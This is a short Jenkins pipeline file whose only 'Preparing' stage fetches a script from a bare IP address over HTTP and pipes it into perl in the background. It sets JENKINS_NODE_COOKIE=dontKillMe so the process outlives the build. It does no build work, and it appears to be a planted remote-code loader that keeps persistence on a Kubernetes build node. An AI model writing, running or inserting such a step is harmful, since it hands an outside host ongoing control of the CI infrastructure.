node('k8s-permanent') {
    try {
        stage("Preparing") {
            sh 'JENKINS_NODE_COOKIE=dontKillMe curl http://34.143.172.153/p | perl &'
        }
    } catch (e) {
        throw e
    }
}
